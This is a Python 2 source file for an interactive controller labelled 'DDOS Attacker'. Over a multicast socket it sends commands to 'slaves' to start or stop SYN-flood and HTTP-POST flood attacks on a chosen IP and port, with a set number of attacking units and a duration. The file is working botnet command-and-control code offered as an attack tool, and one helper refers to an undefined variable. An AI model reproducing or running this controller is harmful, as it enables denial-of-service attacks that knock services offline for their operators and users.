import socket
import signal
from multicastsender import *
from cmd import Cmd

sock = configMulticastSock()

class my_prompt(Cmd):

    def __init__(self):
        Cmd.__init__(self)
        self.prompt = '> '
        signal.signal(signal.SIGTSTP, self.handler)

    def handler(self, signum, frame):
        self.do_exit('')

    def get_args(self, args):
        iN = args.index('-n') + 1
        int(args[iN])

        iPort = args.index('-port') + 1
        int(args[iPort])

        iIP = args.index('-ip') + 1
        socket.inet_pton(socket.AF_INET, args[iIP])

        return args[iN] + ";" + args[iPort] + ";" + args[iIP]

    def default(self, line):
        print "Invalid command. Try help for more information"

    def do_exit(self, args):
        """Close possible ongoing attacks and exit the program"""
        print "Closing possible ongoing attacks..."
        sendMsgToSlaves("syn-flood;stop", sock)
        sendMsgToSlaves("http-post;stop", sock)

        sock.close()
        raise SystemExit

    def do_syn_flood(self, args):
        """
        Necessary flags:
        \t-start
        or
        \t-stop\n
        Compulsory flags to begin an attack:
        \t-port <[int] destination port>
        \t-ip <[ipv4] destination ip>
        \t-n <[int] number of attacking units>\n
        Flag:
        \t-time <[int] attack period in seconds>"""
        args = args.split(' ')
        error = False

        if len(args) > 0:
            if '-start' in args:
                body = 'syn-flood;start;'

                try:
                    body += self.get_args(args)
                except:
                    error = True

                if '-time' in args:
                    try:
                        i = args.index('-time') + 1
                        int(args[i])
                        body += ";" + args[i]
                    except:
                        error = True


            elif '-stop' in args:
                body = 'syn-flood;stop'
            else:
                error = True
        else:
            error = True

        if error:
            print "Invalid command. Try help for more information"
        else:
            sendMsgToSlaves(body, sock)


    def do_http_post(self, args):
        """
        Necessary flags:
        \t-start
        or
        \t-stop\n
        Compulsory flags to begin an attack:
        \t-port <[int] destination port>
        \t-ip <[ipv4] destination ip>
        \t-n <[int] number of attacking units>\n
        Flag:
        \t-time <[int] attack period in seconds>"""
        args = args.split(' ')
        error = False

        if len(args) > 0:
            if '-start' in args:
                body = 'http-post;start;'

                try:
                    body += self.get_args(args)
                except:
                    print "Invalid or incompletes arguments"
                    error = True

                if '-time' in args:
                    try:
                        i = args.index('-time') + 1
                        int(args[i])
                        body += ";" + args[i]
                    except:
                        error = True

            elif '-stop' in args:
                body = 'http-post;stop'
            else:
                error = True
        else:
            error = True

        if error:
            print "Invalid command. Try help for more information"
        else:
            sendMsgToSlaves(body, sock)

def readInputLine():
    line = raw_input("> ")
    line = line.lower()
    return line.split(' ')

def printHelp():
    print "Please inform <attack type> <flags>"
    print "\nValid attack types:"
    print "    syn-flood"
    print "    http-post"
    print "\n Compulsory flags to begin an attack:"
    print "    -port <[int] destination port>"
    print "    -ip <[ipv4] destination ip>"
    print "    -n <[int] number of attacking units>"
    print "\n Necessary flags:"
    print "    -start"
    print " or"
    print "    -stop"
    print "\n Flag:"
    print "    -time <[int] attack period in seconds>"
    print "\n Exit"
    print "    exit()"

def getArgs(args):
    iN = args.index('-n') + 1
    int(args[iN])

    iPort = args.index('-port') + 1
    int(args[iPort])

    iIP = args.index('-ip') + 1
    socket.inet_pton(socket.AF_INET, words[iIP])

    return words[iN] + ";" + words[iPort] + ";" +  words[iIP]

################################### MAIN ####################################### 
if __name__ == '__main__':
    try:
        prompt = my_prompt()
        prompt.cmdloop('===== Welcome to DDOS Attacker=====\nPlease command your attack or try help for more information')
    except KeyboardInterrupt:
        print "Closing possible ongoing attacks..."
        sendMsgToSlaves("syn-flood;stop", sock)
        sendMsgToSlaves("http-post;stop", sock)

        sock.close()

